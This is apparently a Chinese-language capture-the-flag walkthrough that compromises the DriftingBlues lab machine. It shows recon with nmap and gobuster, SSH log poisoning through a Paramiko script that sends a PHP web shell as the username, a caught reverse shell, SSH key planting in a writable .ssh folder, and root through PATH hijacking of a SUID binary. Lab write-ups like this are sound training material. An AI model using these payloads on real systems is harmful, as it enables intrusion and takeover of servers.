# 信息收集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-08 10:27 EDT
Nmap scan report for 192.168.21.5
Host is up (0.00023s latency).
MAC Address: 08:00:27:58:D4:01 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.7
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.93 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.21.5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-08 10:28 EDT
Nmap scan report for 192.168.21.5
Host is up (0.00036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:58:D4:01 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```

# 漏洞利用

目录枚举

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/big.txt -u http://192.168.21.5 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
MANIFEST.MF          (Status: 200) [Size: 11]
Makefile             (Status: 200) [Size: 11]
drupal               (Status: 301) [Size: 313] [--> http://192.168.21.5/drupal/]                                        
phpmyadmin           (Status: 301) [Size: 317] [--> http://192.168.21.5/phpmyadmin/]                                    
privacy              (Status: 301) [Size: 314] [--> http://192.168.21.5/privacy/]                                       
robots.txt           (Status: 200) [Size: 37]
secret               (Status: 301) [Size: 313] [--> http://192.168.21.5/secret/]                                        
server-status        (Status: 403) [Size: 277]
wp-admin             (Status: 301) [Size: 315] [--> http://192.168.21.5/wp-admin/]                                      
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

/robots.txt

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5/robots.txt
User-agent: *
Disallow: /eventadmins
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5/eventadmins/
<!DOCTYPE html>
<html>
<body>
<p>man there's a problem with ssh</p>
<p>john said "it's poisonous!!! stay away!!!"</p>
<p>idk if he's mentally challenged</p>
<p>please find and fix it</p>
<p>also check /littlequeenofspades.html</p>
<p>your buddy, buddyG</p>
</body>
</html>
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5/littlequeenofspades.html
<!DOCTYPE html>
<html>
<body>
<p>Now, she is a little queen of spades, and the men will not let her be                            </p>
<p>Mmmm, she is the little queen of spades, and the men will not let her be             </p>
<p>Everytime she makes a spread, hoo fair brown, cold chill just runs all over me       </p>
<p>I'm gon' get me a gamblin' woman, if the last thing that I do                        </p>
<p>Eee, gon' get me a gamblin' woman, if it's the last thing that I do                  </p>
<p>Well, a man don't need a woman, ooh fair brown, that he got to give all his money to </p>
<p>Everybody say she got a mojo, now she's been usin' that stuff                        </p>
<p>Mmmm, mmmm, 'verybody says she got a mojo, 'cause she been usin' that stuff          </p>
<p>But she got a way trimmin' down, hoo fair brown, and I mean it's most too tough      </p>
<p>Now, little girl, since I am the king, baby, and you is a queen                      </p>
<p>Ooo eee, since I am the king baby, and you is a queen                                </p>
<p>Le's us put our heads together, hoo fair brown, then we can make our money green     </p>
<p style="color:white">aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==</p>
</html>
┌──(kali㉿kali)-[~]
└─$ echo "aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==" | base64 -d
intruder? L2FkbWluc2ZpeGl0LnBocA==                                                            
┌──(kali㉿kali)-[~]
└─$ echo "L2FkbWluc2ZpeGl0LnBocA==" | base64 -d
/adminsfixit.php
```

ssh的日志

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5/adminsfixit.php
<!DOCTYPE html>
<html>
<body>
<p>#######################################################################</p>
<p>ssh auth log</p>
<p>============</p>
<p>i hope some wacky and uncharacteristic thing would not happen</p>
<p>this job is fucking poisonous and im boutta planck length away from quitting this hoe</p>
<p>-abuzer komurcu</p>
<p>#######################################################################</p>
<p> </p>
<p> </p>
</html>
Jun  8 09:25:45 driftingblues sshd[508]: Server listening on 0.0.0.0 port 22.
Jun  8 09:26:01 driftingblues CRON[741]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:26:01 driftingblues CRON[741]: pam_unix(cron:session): session closed for user root
Jun  8 09:27:02 driftingblues CRON[745]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:27:02 driftingblues CRON[745]: pam_unix(cron:session): session closed for user root
Jun  8 09:28:01 driftingblues CRON[749]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:28:01 driftingblues CRON[749]: pam_unix(cron:session): session closed for user root
Jun  8 09:28:29 driftingblues sshd[753]: Did not receive identification string from 192.168.21.7 port 37382
Jun  8 09:29:01 driftingblues CRON[754]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:29:01 driftingblues CRON[754]: pam_unix(cron:session): session closed for user root
Jun  8 09:30:01 driftingblues CRON[758]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:30:01 driftingblues CRON[758]: pam_unix(cron:session): session closed for user root
Jun  8 09:31:01 driftingblues CRON[763]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:31:01 driftingblues CRON[763]: pam_unix(cron:session): session closed for user root
Jun  8 09:32:01 driftingblues CRON[774]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:32:01 driftingblues CRON[774]: pam_unix(cron:session): session closed for user root
Jun  8 09:33:01 driftingblues CRON[779]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:33:01 driftingblues CRON[779]: pam_unix(cron:session): session closed for user root
Jun  8 09:34:01 driftingblues CRON[783]: pam_unix(cron:session): session opened for user root by (uid=0)
```

看一下能不能写进去

```
┌──(kali㉿kali)-[~]
└─$ ssh 123@192.168.21.5                     
123@192.168.21.5: Permission denied (publickey).                                            
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5/adminsfixit.php
<!DOCTYPE html>
<html>
<body>
<p>#######################################################################</p>
<p>ssh auth log</p>
<p>============</p>
<p>i hope some wacky and uncharacteristic thing would not happen</p>
<p>this job is fucking poisonous and im boutta planck length away from quitting this hoe</p>
<p>-abuzer komurcu</p>
<p>#######################################################################</p>
<p> </p>
<p> </p>
</html>
Jun  8 09:25:45 driftingblues sshd[508]: Server listening on 0.0.0.0 port 22.
Jun  8 09:26:01 driftingblues CRON[741]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:26:01 driftingblues CRON[741]: pam_unix(cron:session): session closed for user root
Jun  8 09:27:02 driftingblues CRON[745]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:27:02 driftingblues CRON[745]: pam_unix(cron:session): session closed for user root
Jun  8 09:28:01 driftingblues CRON[749]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:28:01 driftingblues CRON[749]: pam_unix(cron:session): session closed for user root
Jun  8 09:28:29 driftingblues sshd[753]: Did not receive identification string from 192.168.21.7 port 37382
Jun  8 09:29:01 driftingblues CRON[754]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:29:01 driftingblues CRON[754]: pam_unix(cron:session): session closed for user root
Jun  8 09:30:01 driftingblues CRON[758]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:30:01 driftingblues CRON[758]: pam_unix(cron:session): session closed for user root
Jun  8 09:31:01 driftingblues CRON[763]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:31:01 driftingblues CRON[763]: pam_unix(cron:session): session closed for user root
Jun  8 09:32:01 driftingblues CRON[774]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:32:01 driftingblues CRON[774]: pam_unix(cron:session): session closed for user root
Jun  8 09:33:01 driftingblues CRON[779]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:33:01 driftingblues CRON[779]: pam_unix(cron:session): session closed for user root
Jun  8 09:34:01 driftingblues CRON[783]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  8 09:34:01 driftingblues CRON[783]: pam_unix(cron:session): session closed for user root
Jun  8 09:34:33 driftingblues sshd[787]: Connection closed by 192.168.21.7 port 46508 [preauth]
Jun  8 09:34:41 driftingblues sshd[789]: Invalid user 123 from 192.168.21.7 port 57828
Jun  8 09:34:41 driftingblues sshd[789]: Connection closed by invalid user 123 192.168.21.7 port 57828 [preauth]
Jun  8 09:35:01 driftingblues CRON[791]: pam_unix(cron:session): session opened for user root by (uid=0)
```

尝试命令注入，我直接写报错，所以使用Paramiko来完成注入

```
#!/usr/bin/env python3
import paramiko

target = "192.168.21.5"
port = 22
username = '<?php system($_GET["cmd"]); ?>'

transport = paramiko.Transport((target, port))
try:
    transport.connect(username=username, hostkey=None, pkey=None)
except paramiko.BadAuthenticationType:
    print("[+] Username injection sent successfully. Check the log.")
except paramiko.AuthenticationException:
    print("[+] Authentication failed (expected), username logged.")
except Exception as e:
    print(f"[-] Unexpected error: {e}")
finally:
    transport.close()
```

反弹一个shell

```
┌──(kali㉿kali)-[~]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.5] 40382
bash: cannot set terminal process group (560): Inappropriate ioctl for device
bash: no job control in this shell
www-data@driftingblues:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
//.ssh目录可写
www-data@driftingblues:/home/robertj$ ls -la
ls -la
total 16
drwxr-xr-x 3 robertj robertj 4096 Jan  7  2021 .
drwxr-xr-x 4 root    root    4096 Jan  4  2021 ..
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
-r-x------ 1 robertj robertj   33 Jan  7  2021 user.txt
//写入一个私钥
www-data@driftingblues:/home/robertj/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINF75xfJvCasBdvurmk7qnGT7dyDWP+Pvb4iCUnQr6wW kali@kali" > authorized_keys
<GT7dyDWP+Pvb4iCUnQr6wW kali@kali" > authorized_keys
www-data@driftingblues:/home/robertj/.ssh$ chmod 644 /home/robertj/.ssh/authorized_keys
</.ssh$ chmod 644 /home/robertj/.ssh/authorized_keys
//用私钥进行登录
┌──(kali㉿kali)-[~]
└─$ ssh -i key robertj@192.168.21.5
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
robertj@driftingblues:~$ id
uid=1000(robertj) gid=1000(robertj) groups=1000(robertj),1001(operators)
robertj@driftingblues:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/getinfo
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
//看一下getinfo
robertj@driftingblues:~$ /usr/bin/getinfo
###################
ip address
###################

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:58:d4:01 brd ff:ff:ff:ff:ff:ff
    inet 192.168.21.5/24 brd 192.168.21.255 scope global dynamic enp0s3
       valid_lft 83299sec preferred_lft 83299sec
    inet6 fe80::a00:27ff:fe58:d401/64 scope link 
       valid_lft forever preferred_lft forever
###################
hosts
###################

127.0.0.1       localhost
127.0.1.1       driftingblues

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
###################
os info
###################

Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
//写一个恶意脚本
robertj@driftingblues:~$ echo "/bin/bash" > /tmp/ip
robertj@driftingblues:~$ chmod +x /tmp/ip
//环境劫持
robertj@driftingblues:~$ export PATH=/tmp/:$PATH
robertj@driftingblues:~$ /usr/bin/getinfo
###################
ip address
###################

root@driftingblues:~# id
uid=0(root) gid=1000(robertj) groups=1000(robertj),1001(operators)
```